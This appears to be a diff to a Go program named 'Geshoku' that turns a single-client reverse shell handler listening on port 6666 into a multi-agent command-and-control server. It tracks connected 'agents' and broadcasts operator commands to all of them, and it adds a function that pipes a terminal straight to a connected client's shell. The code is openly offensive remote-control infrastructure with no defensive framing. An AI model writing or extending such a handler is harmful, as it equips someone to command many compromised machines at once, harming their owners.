@@ -1,9 +1,16 @@
 package main
 
 import (
+	"bufio"
 	"fmt"
+	"io"
 	"net"
+	"os"
+	"sync"
 )
+
+var agent_list = make(map[string]net.Conn)
+var lock = &sync.Mutex{}
 
 func write_welcome() {
 	fmt.Println("-----------Geshoku------------")
@@ -12,42 +19,55 @@ func write_welcome() {
 	fmt.Println("------------------------------")
 }
 
+func rev_shell(conn net.Conn) {
+	defer conn.Close()
+	fmt.Println("[Info] Client connected:", conn.RemoteAddr())
+	fmt.Println("[Info] Waiting for commands to send to the client")
+	go io.Copy(conn, os.Stdin)
+	fmt.Println("test")
+	io.Copy(os.Stdout, conn)
+}
+
 func handle_client(conn net.Conn) {
 	defer conn.Close()
 	buffer := make([]byte, 1024)
-	fmt.Println("[Info] Client connected:", conn.RemoteAddr())
-	fmt.Println("[Info] Waiting for commands to send to the client")
-	var command string
+	lock.Lock()
+	agentID := conn.RemoteAddr().String()
+	agent_list[agentID] = conn
+	lock.Unlock()
+
+	fmt.Printf("\n[Info] New agent connected: %s\n", agentID)
 	for {
-		for i := range buffer {
-			buffer[i] = 0
-		}
-		fmt.Print("Shell> ")
-		_, err := fmt.Scanln(&command)
+		_, err := conn.Read(buffer)
 		if err != nil {
-			fmt.Println("[Err] Failed to read command:", err)
-			continue
+			fmt.Println("[Info] Agent disconnected")
+			lock.Lock()
+			delete(agent_list, agentID)
+			lock.Unlock()
+			return
+
 		}
-		if command == "quit" {
-			fmt.Println("[Info] Quitting... Closing connection to client.")
-			break
+		fmt.Printf("[Info] %s : %s\n", agentID, buffer)
+	}
+}
+
+func send_orders() {
+	reader := bufio.NewReader(os.Stdin)
+	for {
+		fmt.Print("Command> ")
+		command, _ := reader.ReadString('\n')
+		lock.Lock()
+		for id, conn := range agent_list {
+			_, err := conn.Write([]byte(command))
+			if err != nil {
+				fmt.Printf("[Err] Failed to send command to %s: %v\n", id, err)
+			}
 		}
-		_, err = conn.Write([]byte(command + "\n"))
-		if err != nil {
-			fmt.Println("[Err] Failed to send command to client:", err)
-			break
-		}
-		_, err = conn.Read(buffer)
-		if err != nil {
-			fmt.Println("[Err] Failed to receive response from client:", err)
-			break
-		}
-		fmt.Println(string(buffer[:]))
+		lock.Unlock()
 	}
 }
 
 func start_server() {
-	fmt.Println("[Info] Trying to start server")
 	listener, err := net.Listen("tcp", ":6666")
 	fmt.Println("started server")
 	if err != nil {
@@ -66,6 +86,6 @@ func start_server() {
 
 func main() {
 	write_welcome()
-	start_server()
+	go start_server()
+	send_orders()
 }
-
